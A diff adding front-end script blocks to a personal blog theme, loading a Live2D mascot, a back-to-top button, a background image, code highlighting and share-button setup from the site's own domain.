+<script type="text/javascript" src="https://xmoct.github.io/media/js/live2d.js"></script>
+<script type="text/javascript" src="https://xmoct.github.io/media/live2d/js/message.js"></script>
+<script type="text/javascript">
+    loadlive2d("live2d", "https://xmoct.github.io/media/live2d/assets/tororo.model.json");
+</script>
+
+<!------------------ 加载live2d模型功能（看板娘）👆 ---------------->
+
+
+<!----------------------- 返回顶部按钮功能👇 --------------------->
+<script>
+    $(function () {
+        $('.toggleContainer').click(function () {
+            $('html,body').animate({
+                scrollTop: '0px'
+            }, 800);
+        });
+        $(window).scroll(function () {
+            var st = $(window).scrollTop();
+            if (st > 30) {
+                $(".toggleContainer").fadeIn(400);
+            } else {
+                $(".toggleContainer").fadeOut(100);
+            }
+        });
+    });
+</script>
+<!----------------------- 返回顶部按钮功能👆 --------------------->
+
+
+<!------------ 加载全局背景图功能👇（开始时没有写好，这功能有点鸡肋/(ㄒoㄒ)/~~） -->
+<script>
+    var bgchoice = "link"
+    var bg = $('#bg');
+    var bgurl = document.getElementById("bgurl").innerHTML;
+    if (bgchoice == 'default')
+    {
+        for (var i = 0; i < 3; i++)
+            bgurl = bgurl.replace("\\", "/");
+        bgurl = "https://xmoct.github.io/" + bgurl;
+    }
+    bg.css("background", "url('" + bgurl + "')");
+
+    window.onload = function () {
+        aplayerbtnInit();
+    }
+</script>
+<!------------ 加载全局背景图功能👆（开始时没有写好，这功能有点鸡肋/(ㄒoㄒ)/~~） -->
+
+
+
+
+<script src="https://xmoct.github.io/media/js/index.js"></script>
+
+
+<script>
+    //加载后的事件同步（阅读量、移动端评论等
+    window.onload = function () {
+    //代码块高亮渲染
+    document.querySelectorAll('pre code').forEach((block) => {
+            hljs.highlightBlock(block);
+    });
+        getHotnum();
+        var sharepc = $(".share").eq(0).html();
+        $(".share").eq(1).html(sharepc);   //插件只会寻找一个分享标签渲染，所以需要手动添加到移动端
+        aplayerbtnInit();
+        $(".hljs").css({
+            "padding": "20px"
+        })
+    }
+</script>
+
+<!-- <script src="https://xmoct.github.io/media/js/av-min.js"></script> -->
+<!-- <script src="https://cdn.jsdelivr.net/npm/leancloud-storage@3.13.0/dist/av-min.js"></script> -->
+<!-- <script src="https://cdn.jsdelivr.net/npm/leancloud-storage@4.6.1/dist/av-live-query-min.js"></script> -->
